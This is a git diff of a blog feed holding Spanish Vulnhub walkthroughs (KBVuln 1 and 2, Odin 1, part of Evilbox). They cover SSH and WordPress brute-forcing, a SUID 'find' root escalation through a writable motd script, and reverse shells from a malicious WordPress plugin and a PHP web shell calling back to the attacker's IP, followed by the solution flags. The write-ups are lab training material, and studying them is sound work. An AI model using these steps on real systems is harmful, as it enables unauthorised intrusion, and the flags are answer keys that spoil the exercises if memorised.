+<p>Root: 36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><category term="video" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Evilbox.]]></summary></entry><entry><title type="html">KBVuln 1</title><link href="http://localhost:4000/vulnhub/kbvuln1/" rel="alternate" type="text/html" title="KBVuln 1" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/kbvuln1</id><content type="html" xml:base="http://localhost:4000/vulnhub/kbvuln1/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/kb-vuln-1,540/">https://www.vulnhub.com/entry/kb-vuln-1,540/</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.122.0/24
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/1.png" alt="image-center" class="align-center" /></p>
+
+<p>Saldrá una máquina con varios puertos abiertos</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/2.png" alt="image-center" class="align-center" /></p>
+
+<p>Entrar al servidor web desde el navegador, aparecerá una web normal</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/3.png" alt="image-center" class="align-center" /></p>
+
+<p>Analizar directorios ocultos con gobuster</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> –u 192.168.122.4 <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/4.png" alt="image-center" class="align-center" /></p>
+
+<p>No aparece nada fuera de lo normal.</p>
+
+<p>Tratar de entrar en el servidor FTP de forma anónima</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 192.168.122.4
+</code></pre></div></div>
+
+<p>Usuario: Anonymous</p>
+
+<p>Contraseña: Vacía</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/5.png" alt="image-center" class="align-center" /></p>
+
+<p>Mostrar el contenido y descargar el único archivo que se encuentra en el directorio</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/6.png" alt="image-center" class="align-center" /></p>
+
+<p>No se encuentra nada útil</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/7.png" alt="image-center" class="align-center" /></p>
+
+<p>Ver código fuente del sitio web, saldrá un usuario llamado sysadmin</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/8.png" alt="image-center" class="align-center" /></p>
+
+<p>Usar hydra para hacer fuerza bruta al ssh de la máquina con el usuario sysadmin</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hydra <span class="nt">-l</span> sysadmin –P /usr/share/wordlists/rockyou.txt 192.168.122.4 ssh
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/9.png" alt="image-center" class="align-center" /></p>
+
+<p>Entar por ssh a la máquina usando el usuario sysadmin y la contraseña obtenida con hydra</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/10.png" alt="image-center" class="align-center" /></p>
+
+<p>Mostrar el contenido y leer el archivo user.txt, mostrará el flag del usuario</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/11.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio ftp y mostrar el contenido</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/12.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el archivo .bash_history</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/13.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio /etc/update-motd.d/ y mostrar todo el contenido</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/14.png" alt="image-center" class="align-center" /></p>
+
+<p>Saldrá un archivo con todos los permisos, este controla el mensaje que aparece cada vez que se inicia una sesión por SSH</p>
+
+<p>Editar el archivo /etc/update.motd.d/00-header y añadir al final:</p>
+
+<p>sudo chmod u+s /usr/bin/find</p>
+
+<p>Esto permitirá usar un comando que cambiará el usuario a root</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/15.png" alt="image-center" class="align-center" /></p>
+
+<p>Usar el comando para obtener acceso root:
+find . -exec /bin/bash -p \; -quit</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/16.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio de root y leer el flag</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/17.png" alt="image-center" class="align-center" /></p>
+
+<h2 id="flags">Flags</h2>
+
+<p>Usuario: 48a365b4ce1e322a55ae9017f3daf0c0</p>
+
+<p>Root: 1eedddf9fff436e6648b5e51cb0d2ec7</p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de KBVuln 1.]]></summary></entry><entry><title type="html">KBVuln 2</title><link href="http://localhost:4000/vulnhub/kbvuln2/" rel="alternate" type="text/html" title="KBVuln 2" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/kbvuln2</id><content type="html" xml:base="http://localhost:4000/vulnhub/kbvuln2/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/kb-vuln-2,562/">https://www.vulnhub.com/entry/kb-vuln-2,562/</a></p>
+
+<p><a href="https://github.com/wetw0rk/malicious-wordpress-plugin">https://github.com/wetw0rk/malicious-wordpress-plugin</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.122.0/24
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/1.png" alt="image-center" class="align-center" /></p>
+
+<p>Saldrá una máquina con varios puertos abiertos</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/2.png" alt="image-center" class="align-center" /></p>
+
+<p>Entrar al servidor web con la dirección 192.168.122.6, saldrá la web por defecto de Apache</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/3.png" alt="image-center" class="align-center" /></p>
+
+<p>Usar gobuster para ver directorios ocultos, mostrará como resultado varios directorios, entre ellos uno llamado wordpress</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> 192.168.122.6 <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/4.png" alt="image-center" class="align-center" /></p>
+
+<p>Enumerar los usuarios de la web de wordpress, solo encontrará el usuario admin</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>wpscan <span class="nt">--url</span> 192.168.122.6/wordpress <span class="nt">-e</span> u
+</code></pre></div></div>
+
+<p>Usuario: Anonymous
+Contraseña: Vacía</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/5.png" alt="image-center" class="align-center" />
+<img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/6.png" alt="image-center" class="align-center" /></p>
+
+<p>Lanzar un ataque de fuerza bruta para encontrar la contraseña del usuario admin, no dará resultado</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/7.png" alt="image-center" class="align-center" /></p>
+
+<p>Buscar usuarios en el sistema, solo encontrará kbadmin</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/8.png" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/9.png" alt="image-center" class="align-center" /></p>
+
+<p>Intentar un ataque de fuerza bruta para conseguir la contraseña, no dará resultado</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hydra <span class="nt">-l</span> kbadmin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 192.168.122.6 ssh
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/10.png" alt="image-center" class="align-center" /></p>
+
+<p>Ver directorios compartidos por smb</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span>  192.168.122.6
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/11.png" alt="image-center" class="align-center" /></p>
+
+<p>Entrar al directorio de Anonymous y mostrar el contenido</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-N</span> //192.168.122.6/Anonymous
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/12.png" alt="image-center" class="align-center" /></p>
+
+<p>Descargar el archivo backup.zip</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get backup.zip
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/13.png" alt="image-center" class="align-center" /></p>
+
+<p>Moverlo a un nuevo directorio y descomprimirlo</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>kbvuln2
+<span class="nb">mv </span>backup.zip kbvuln2/
+<span class="nb">ls
+</span>unzip backup.zip
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/14.png" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/15.png" alt="image-center" class="align-center" /></p>
+
+<p>Creará un directorio llamado wordpress y un archivo llamado <code class="language-plaintext highlighter-rouge">remember_me.txt</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/16.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el archivo remember_me.txt, mostrará un usuario y contraseña</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/17.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al login de la web de wordpress</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/18.png" alt="image-center" class="align-center" /></p>
+
+<p>Copiar la direccion DNS del action del formulario.</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/19.png" alt="image-center" class="align-center" /></p>
+
+<p>Añadir el dominio dns al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/20.png" alt="image-center" class="align-center" /></p>
+
+<p>Recargar el sitio, ahora se verá correctamente</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/21.png" alt="image-center" class="align-center" /></p>
+
+<p>Colocar el usuario y contraseña y dar en Log In</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/22.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al editor de temas de wordpress</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/23.png" alt="image-center" class="align-center" /></p>
+
+<p>Editar el archivo 404 con un script de reverse_php</p>
+
+<p>Preparar un plugin que hará un shell inverso</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ~/Downloads/repos
 
 git clone https://github.com/wetw0rk/malicious-wordpress-plugin.git
 
-cd malicious-wordpress-plugin
+<span class="nb">cd </span>malicious-wordpress-plugin
 
 Python wordpwn.py 192.168.122.5 4444 Y
-```
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/24.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/24.png" alt="image-center" class="align-center" /></p>
 
-Se pondrá de forma automática en escucha
+<p>Se pondrá de forma automática en escucha</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/25.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/25.png" alt="image-center" class="align-center" /></p>
 
-Y se creará un archivo zip
+<p>Y se creará un archivo zip</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/26.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/26.png" alt="image-center" class="align-center" /></p>
 
-Subir el plugin al sitio de wordpress
+<p>Subir el plugin al sitio de wordpress</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/27.png){: .align-center}
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/28.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/27.png" alt="image-center" class="align-center" />
+<img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/28.png" alt="image-center" class="align-center" /></p>
 
-Activar el plugin
+<p>Activar el plugin</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/29.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/29.png" alt="image-center" class="align-center" /></p>
 
-Ir al editor de plugins y seleccionar GotEm
+<p>Ir al editor de plugins y seleccionar GotEm</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/30.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/30.png" alt="image-center" class="align-center" /></p>
 
-Ir a la ruta del plugin
-`http://192.168.122.6/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php`
+<p>Ir a la ruta del plugin
+<code class="language-plaintext highlighter-rouge">http://192.168.122.6/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/31.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/31.png" alt="image-center" class="align-center" /></p>
 
-Se abrirá un shell inverso con meterpreter
+<p>Se abrirá un shell inverso con meterpreter</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/32.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/32.png" alt="image-center" class="align-center" /></p>
 
-Cambiar a shell y ver el usuario  
+<p>Cambiar a shell y ver el usuario</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/33.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/33.png" alt="image-center" class="align-center" /></p>
 
-Ir al directorio home del usuario kbadmin y mostrar el contenido, luego leer el archivo `user.txt`
+<p>Ir al directorio home del usuario kbadmin y mostrar el contenido, luego leer el archivo <code class="language-plaintext highlighter-rouge">user.txt</code></p>
 
-Dará la flag del usuario
+<p>Dará la flag del usuario</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/34.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/34.png" alt="image-center" class="align-center" /></p>
 
-Ir a /var/www/html y mostrar el contenido
+<p>Ir a /var/www/html y mostrar el contenido</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/35.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/35.png" alt="image-center" class="align-center" /></p>
 
-Leer el contenido de read_ME.txt
+<p>Leer el contenido de read_ME.txt</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/36.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/36.png" alt="image-center" class="align-center" /></p>
 
-Leer el contenido del archivo remember_me.txt
+<p>Leer el contenido del archivo remember_me.txt</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/37.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/37.png" alt="image-center" class="align-center" /></p>
 
-Tratar de acceder por ssh al usuario kbadmin con esa contraseña
+<p>Tratar de acceder por ssh al usuario kbadmin con esa contraseña</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/38.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/38.png" alt="image-center" class="align-center" /></p>
 
-Ver los permisos del usuario kbadmin usando el comando `sudo –l`, mostrará que tiene todos los permisos por lo que puede cambiar al usuario root sin necesidad de introducir contraseña.
+<p>Ver los permisos del usuario kbadmin usando el comando <code class="language-plaintext highlighter-rouge">sudo –l</code>, mostrará que tiene todos los permisos por lo que puede cambiar al usuario root sin necesidad de introducir contraseña.</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/39.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/39.png" alt="image-center" class="align-center" /></p>
 
-Cambiar al usuario root
+<p>Cambiar al usuario root</p>
 
-```bash
-sudo su
-```
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/40.png){: .align-center}
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
+</code></pre></div></div>
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/40.png" alt="image-center" class="align-center" /></p>
 
-Ir al directorio de root y mostrar el contenido
+<p>Ir al directorio de root y mostrar el contenido</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/41.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/41.png" alt="image-center" class="align-center" /></p>
 
-Mostrar el contenido de flag.txt
+<p>Mostrar el contenido de flag.txt</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/42.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/42.png" alt="image-center" class="align-center" /></p>
 
-## Flags
+<h2 id="flags">Flags</h2>
 
-Usuario: 03bf4d20dac5644c75e69e40bad48db0
+<p>Usuario: 03bf4d20dac5644c75e69e40bad48db0</p>
 
-Root: dc387b4cf1a4143f562dd1bdb3790ff1]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de KBVuln 2.]]></summary></entry><entry><title type="html">KBVuln 1</title><link href="http://localhost:4000/vulnhub/kbvuln1/" rel="alternate" type="text/html" title="KBVuln 1" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/kbvuln1</id><content type="html" xml:base="http://localhost:4000/vulnhub/kbvuln1/"><![CDATA[[https://www.vulnhub.com/entry/kb-vuln-1,540/](https://www.vulnhub.com/entry/kb-vuln-1,540/)
+<p>Root: dc387b4cf1a4143f562dd1bdb3790ff1</p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de KBVuln 2.]]></summary></entry><entry><title type="html">Odin 1</title><link href="http://localhost:4000/vulnhub/odin1/" rel="alternate" type="text/html" title="Odin 1" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/odin1</id><content type="html" xml:base="http://localhost:4000/vulnhub/odin1/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/odin-1,619/">https://www.vulnhub.com/entry/odin-1,619//</a></p>
 
-```bash
-sudo nmap -vvv -sS -sV -O 192.168.122.0/24
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 192.168.122.0/24
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/1.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/1.png" alt="image-center" class="align-center" /></p>
 
-Saldrá una máquina con varios puertos abiertos
+<p>Aparecerá una máquina con el puerto 80 abierto</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/2.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/2.png" alt="image-center" class="align-center" /></p>
 
-Entrar al servidor web desde el navegador, aparecerá una web normal
+<p>Aparecerá una máquina con el puerto 80 abierto</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/3.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/3.png" alt="image-center" class="align-center" /></p>
 
-Analizar directorios ocultos con gobuster
-```bash
-gobuster dir –u 192.168.122.4 -w /usr/share/dirb/wordlists/common.txt
-```
+<p>Editar el archivo <code class="language-plaintext highlighter-rouge">/etc/host</code> y añadir la ip de la máquina con su respectivo DNS</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/4.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/4.png" alt="image-center" class="align-center" /></p>
 
-No aparece nada fuera de lo normal.
+<p>Hacer click en el primer artículo y pasarlo por dcode.fr</p>
 
-Tratar de entrar en el servidor FTP de forma anónima
-```bash
-ftp 192.168.122.4
-```
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/5.png" alt="image-center" class="align-center" /></p>
 
-Usuario: Anonymous
+<p>Saldrá que está cifrado en Base32</p>
 
-Contraseña: Vacía
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/6.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/5.png){: .align-center}
+<p>Usar el descifrador de Base32, pondrá un enlace que lleva al repositorio de SecLists, específicamente al wordlist de rockyou</p>
 
-Mostrar el contenido y descargar el único archivo que se encuentra en el directorio
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/7.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/6.png){: .align-center}
+<p>Realizar el mismo proceso con el siguiente texto</p>
 
-No se encuentra nada útil
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/8.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/7.png){: .align-center}
+<p>Saldrá que es Base64, descifrarlo</p>
 
-Ver código fuente del sitio web, saldrá un usuario llamado sysadmin
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/9.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/8.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/10.png" alt="image-center" class="align-center" /></p>
 
-Usar hydra para hacer fuerza bruta al ssh de la máquina con el usuario sysadmin
+<p>Y por último con el comentario del artículo</p>
 
-```bash
-sudo hydra -l sysadmin –P /usr/share/wordlists/rockyou.txt 192.168.122.4 ssh
-```
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/11.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/9.png){: .align-center}
+<p>Saldrá que es brainfuck</p>
 
-Entar por ssh a la máquina usando el usuario sysadmin y la contraseña obtenida con hydra
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/12.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/10.png){: .align-center}
+<p>No mostrará nada relevante</p>
 
-Mostrar el contenido y leer el archivo user.txt, mostrará el flag del usuario
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/13.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/11.png){: .align-center}
+<p>Ir al login de la web y probar un usuario</p>
 
-Ir al directorio ftp y mostrar el contenido
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/14.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/12.png){: .align-center}
+<p>Mostrará que el usuario no existe</p>
 
-Leer el archivo .bash_history
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/15.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/13.png){: .align-center}
+<p>Probar con admin, mostrará que el usuario existe pero la contraseña es incorrecta</p>
 
-Ir al directorio /etc/update-motd.d/ y mostrar todo el contenido
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/16.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/14.png){: .align-center}
+<p>Usar wpcan para encontrar la contraseña del usuario admin utilizando el wordlist de rockyou</p>
 
-Saldrá un archivo con todos los permisos, este controla el mensaje que aparece cada vez que se inicia una sesión por SSH
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>wpscan <span class="nt">--192</span>.168.122.6 <span class="nt">--usernames</span> admin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
 
-Editar el archivo /etc/update.motd.d/00-header y añadir al final:
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/17.png" alt="image-center" class="align-center" /></p>
 
-sudo chmod u+s /usr/bin/find
+<p>Encontrará una contraseña para el usuario admin</p>
 
-Esto permitirá usar un comando que cambiará el usuario a root
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/18.png" alt="image-center" class="align-center" />
+<img src="http://localhost:4000/assets/images/vulnhub/odin1/19.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/15.png){: .align-center}
+<p>Entrar al panel de control de wordpress con el usuario admin y la contraseña que ha mostrado wpscan</p>
 
-Usar el comando para obtener acceso root:
-find . -exec /bin/bash -p \; -quit
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/20.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/16.png){: .align-center}
+<p>Dará acceso al panel de control de la web</p>
 
-Ir al directorio de root y leer el flag
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/20.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/17.png){: .align-center}
+<p>Ir al editor de temas y probar si puede modificarse el tema del error 404
+Copiar el contenido de <code class="language-plaintext highlighter-rouge">/usr/share/webshells/php/php-reverse-shell.php</code></p>
 
-## Flags
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/21.png" alt="image-center" class="align-center" /></p>
 
-Usuario: 48a365b4ce1e322a55ae9017f3daf0c0
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/22.png" alt="image-center" class="align-center" /></p>
 
-Root: 1eedddf9fff436e6648b5e51cb0d2ec7]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de KBVuln 1.]]></summary></entry><entry><title type="html">Evilbox</title><link href="http://localhost:4000/vulnhub/evilbox/" rel="alternate" type="text/html" title="Evilbox" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/evilbox</id><content type="html" xml:base="http://localhost:4000/vulnhub/evilbox/"><![CDATA[[https://www.vulnhub.com/entry/evilbox-one,736/](https://www.vulnhub.com/entry/evilbox-one,736/)
+<p>Pegarlo en el tema del error 404</p>
 
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/23.png" alt="image-center" class="align-center" /></p>
 
-```bash
-sudo nmap -vvv -sS -sV -O -Pn 192.168.122.0/24
-```
+<p>Ver la IP del equipo atacante</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/1.png){: .align-center}
+<p>ifconfig</p>
 
-Saldrá una IP con los puertos 80 y 22 abiertos
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/24.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/2.png){: .align-center}
+<p>Cambiar el puerto y la ip en el script</p>
 
-Al entrar en la web aparecerá la página por defecto de Apache y no se mostrará nada en el código fuente
